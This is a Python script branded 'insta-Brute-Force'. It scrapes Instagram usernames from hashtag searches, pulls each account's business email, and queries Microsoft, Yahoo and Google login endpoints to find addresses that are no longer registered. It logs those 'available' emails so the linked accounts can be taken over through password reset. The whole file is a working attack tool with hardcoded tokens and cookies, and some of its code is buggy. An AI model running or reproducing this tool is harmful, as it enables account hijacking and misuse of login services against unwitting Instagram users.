import os
import sys
import hashlib
import mechanize
import requests
import secrets
from time import sleep



cookie = secrets.token_hex(8) * 2
if sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
else:
    os.system("clear")


def rhaby(s):
    for ASU in s + '\n':
        sys.stdout.write(ASU)
        sys.stdout.flush()
        sleep(50. / 10000)


API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
__banner__ = """\033[1;33m
 |\   /| IBFrhaby - insta-Brute-Force
  \|_|/  Author: ArHaBy*
  /. .\  Version: 2.0v
 =\_Y_/= Telegram: @ciku370
  {>o<}  Insta: @ali.rhaby
=============================================="""
print(__banner__)
rhaby("$ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ")
rhaby("$ 1- hashtag user")
rhaby("$")
rhaby("$ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ")
rhaby("$ 2- IBFrhaby")
rhaby("$")
ali1 = input("$ enter number tool : ")
if ali1 == '2':
    import requests
    import os
    from bs4 import BeautifulSoup
    class Instagram:

        def __init__(self, username):
            self.username = str(username)

        def print_info(self):
            url = 'https://www.instagram.com/' + self.username + '/?__a=1'
            payload = ''
            headers = {'accept':'application/json, text/plain, */*', 
             'accept-encoding':'gzip, deflate, br', 
             'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7', 
             'sec-ch-ua':'"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"', 
             'sec-ch-ua-mobile':'?0', 
             'sec-fetch-dest':'empty', 
             'sec-fetch-mode':'cors', 
             'sec-fetch-site':'none', 
             'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; motorola one Build/OPKS28.63-18-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Instagram 72.0.0.21.98 Android (27/8.1.0; 320dpi; 720x1362; motorola; motorola one; deen_sprout; qcom; pt_BR; 132081645)'}
            r = requests.Session().get(url, data=payload, headers=headers)
            businessA = str(r.json()['graphql']['user']['is_business_account'])
            email = str(r.json()['graphql']['user']['business_email'])
            followes = str(r.json()['graphql']['user']['edge_followed_by']['count'])
            following = str(r.json()['graphql']['user']['edge_follow']['count'])
            aliii = (email[-12:-1])
            yhaooo = (email[-9:-1])
            green = "\033[0;32m"
            red = "\033[0;31m"
            if (aliii == "@outlook.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
                payload = ''
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                response = requests.get(aaa, data=payload, headers=headers)
                if "Neither" in response.text:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(followes))
                    print(" Following: {}".format(following))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(followes) + "\n" + email + "\n")
                    print("")
                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")
            elif (aliii == "@hotmail.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
                payload = ''
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                response = requests.get(aaa, data=payload, headers=headers)
                if "Neither" in response.text:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(followes))
                    print(" Following: {}".format(following))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(followes) + "\n" + email + "\n")
                    print("")
                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")

            elif (aliii == "@outlook.s"):
                print(green + "[*] Trying user: {}".format(self.username))
                aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
                payload = ''
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                response = requests.get(aaa, data=payload, headers=headers)
                if "Neither" in response.text:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(followes))
                    print(" Following: {}".format(following))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(followes) + "\n" + email + "\n")
                    print("")

                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")
                        
            elif (yhaooo == "yahoo.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                with open('NotAvailable.txt', 'a') as x:
                    x.write(email + "\n")
                import os, sys, mechanize, re
                from requests.exceptions import ConnectionError

                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
                yahoo = re.compile('@.*')
                otw = yahoo.search(email).group()
                if 'yahoo.com' in otw:
                    br.open(
                        'https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                    br._factory.is_html = True
                    br.select_form(nr=0)
                    br['username'] = email
                    klik = br.submit().read()
                    jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                    try:
                        pek = jok.search(klik).group()
                    except:
                        print(red + "[*] Trying: " + email)

                    if '"messages.ERROR_INVALID_USERNAME">' in pek:
                        print(' ☠' * 15)
                        print("")
                        print(" user: {}".format(self.username))
                        print(" Followers: {}".format(followes))
                        print(" Following: {}".format(following))
                        print(green + ' Available : ' + email)
                        with open('Available.txt', 'a') as x:
                            x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(followers) + "\n" + email + "\n")
                        print("")
                    
                        
            elif (yhaooo == "gmail.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                urlgmail = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j'
                headersgmail = {'accept':'*/*', 
                    'accept-encoding':'gzip, deflate, br', 
                    'accept-language':'ar,en-US;q=0.9,en;q=0.8', 
                    'content-length':'3893', 
                    'content-type':'application/x-www-form-urlencoded;charset=UTF-8', 
                    'cookie':cookie, 
                    'google-accounts-xsrf':'1', 
                    'origin':'https://accounts.google.com', 
                    'referer':'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession', 
                    'sec-fetch-dest':'empty', 
                    'sec-fetch-mode':'cors', 
                    'sec-fetch-site':'same-origin', 
                    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36', 
                    'x-chrome-id-consistency-request':'', 
                    'x-client-data':'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=', 
                    'Decoded':'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];', 
                    'x-same-domain':'1'
                }
                
                datagmail = {'continue':'https://myaccount.google.com/?utm_source=sign_in_no_continue',  'service':'accountsettings', 
                     'f.req':f'["{email}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{email}",null,null,null,true,true,[]]', 
                     'bgRequest':'["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]', 
                     'at':'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804', 
                     'azt':'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805', 
                     'cookiesDisabled':'false', 
                     'deviceinfo':'[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]', 
                     'gmscoreversion':'undefined', 
                     'checkConnection':'youtube:353:0', 
                     'checkedDomains':'youtube', 
                     'pstMsg':'1'}
                req2 = requests.post(urlgmail, data=datagmail, headers=headersgmail).text
                if ',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]' in req2:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(followers))
                    print(" Following: {}".format(following))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(followers) + "\n" + email + "\n")
                    print("")
                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")
                        
                
            else:
                print(red + "[*] User Not Bussins : {}".format(self.username))
    class Helper:

        @staticmethod
        def read_file(filename):
            """
            Returns account lists
            :param filename:
            :return list:
            """
            accounts = [line.rstrip('\n') for line in open(filename, encoding='utf8')]
            return accounts

        @staticmethod
        def retry():
            """
            Decides wanna try again
            :return boolean:
            """
            q = input(' Press E to repeat operation or press H to exit the program: ')
            if q.upper() == 'E':
                os.system('cls||clear')
                return True
            return False


    if __name__ == '__main__':
        while True:
            accounts = Helper.read_file('accounts.txt')
            for account in accounts:
                info = Instagram(account)
                try:
                    info.print_info()
                except Exception as e:
                    try:
                        print(e)
                    finally:
                        e = None
                        del e

            else:
                retry = Helper.retry()

            if not retry:
                break

if ali1 == '1':
    import requests
    import secrets
    import sys as n
    import time as mm
    from time import sleep
    jruksr= '\033[1;32m'
    jruks = '\033[1;33m'
    ruks_q = '\033[1;36m'
    ruks_h = '\033[1;31m'
    print(ruks_q+'='*60)
    ruks_f=f"""
    {jruksr}
      _____           _                    
     |_   _|         | |                   
       | |  _ __  ___| |_ __ _             
       | | | '_ \/ __| __/ _` |            
      _| |_| | | \__ \ || (_| |            
     |_____|_| |_|___/\__\__,_|      {jruks}      
      _               _     _              
     | |             | |   | |             
     | |__   __ _ ___| |__ | |_ __ _  __ _ 
     | '_ \ / _` / __| '_ \| __/ _` |/ _` |
     | | | | (_| \__ \ | | | || (_| | (_| |
     |_| |_|\__,_|___/_| |_|\__\__,_|\__, |
                                      __/ |
                                     |___/ 
    """
    print(ruks_f)
    print(ruks_q+'='*60)
    head = {
    'HOST': "www.instagram.com",
    'KeepAlive' : 'True',
    'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
    'Cookie': 'cookie',
    'Accept' : "*/*",
    'ContentType' : "application/x-www-form-urlencoded",
    "X-Requested-With" : "XMLHttpRequest",
    "X-IG-App-ID": "936619743392459",
    "X-Instagram-AJAX" : "missing",
    "X-CSRFToken" : "missing",
    "Accept-Language" : "en-US,en;q=0.9"
    }

    ruks = requests.Session()
    rhaby = 'welcome to hashtag user'

    #===============================#
    m1 = input('Hashtag_1 : '+ruks_h)
    m2 = input('Hashtag_2 : '+ruks_q)
    m3 = input('Hashtag_3 :'+ruks_h)
    m4 = input('Hashtag_4 : '+ruks_q)
    m5 = input('Hashtag_5 : '+ruks_h)
    m6 = input('Hashtag_6 : '+ruks_q)
    #===============================#
    print('The rhaby developer tool is free, not for sale')
    print('='*60) 
    def ruks1():
            try:
                    url_id = f'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m1}'
                    mn = 0
                    req_id = ruks.get(url_id,headers=head).json()		
                    while True:
                            mn+=1			
                            y = str(req_id['users'][mn]['user']['username'])
                            with open('accounts.txt', 'a') as (x):
                                x.write(y + '\n')
                            
                            print(f'{y}')
            except Exception as e:
               
                print('='*60)
         
    ruks1()

    #===============================#
    def ruks2():
            try:
                    url_id = f'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m2}'
                    mn = 0
                    req_id = ruks.get(url_id,headers=head).json()		
                    while True:
                            mn+=1			
                            y = str(req_id['users'][mn]['user']['username'])
                            with open('accounts.txt', 'a') as (x):
                                x.write(y + '\n')
                            print(f'{y}')
            except Exception as e:
                
                print('='*60)
         
    ruks2()	
    #===============================#
    def ruks3():
            try:
                    url_id = f'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m3}'
                    mn = 0
                    req_id = ruks.get(url_id,headers=head).json()		
                    while True:
                            mn+=1			
                            y = str(req_id['users'][mn]['user']['username'])
                            with open('accounts.txt', 'a') as (x):
                                x.write(y + '\n')
                            print(f'{y}')
            except Exception as e:
                
                print('='*60)
         
    ruks3()
    #===============================#
    def ruks4():
            try:
                    url_id = f'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m4}'
                    ruks = 0
                    req_id = ruks.get(url_id,headers=head).json()		
                    while True:
                            mn+=1			
                            y = str(req_id['users'][mn]['user']['username'])
                            with open('accounts.txt', 'a') as (x):
                                x.write(y + '\n')
                            print(f'{y}')
            except Exception as e:
               
                print('='*60)
         
    ruks4()
    #===============================#
    def ruks5():
            try:
                    url_id = f'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m5}'
                    mn = 0
                    req_id = ruks.get(url_id,headers=head).json()		
                    while True:
                            mn+=1			
                            y = str(req_id['users'][mn]['user']['username'])
                            with open('accounts.txt', 'a') as (x):
                                x.write(y + '\n')
                            print(f'{y}')
            except Exception as e:
               
                print('='*60)
         
    ruks5()			
    #===============================#
    def ruks6():
            try:
                    url_id = f'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m6}'
                    mn = 0
                    req_id = ruks.get(url_id,headers=head).json()		
                    while True:
                            mn+=1			
                            y = str(req_id['users'][mn]['user']['username'])
                            with open('accounts.txt', 'a') as (x):
                                x.write(y + '\n')
                            print(f'{y}')
            except Exception as e:
                    print('='*60)
                    print(u'نتهى السحب')  
                    print(u' في لستة User.txt ')       
              
    ruks6()			
    #===============================#
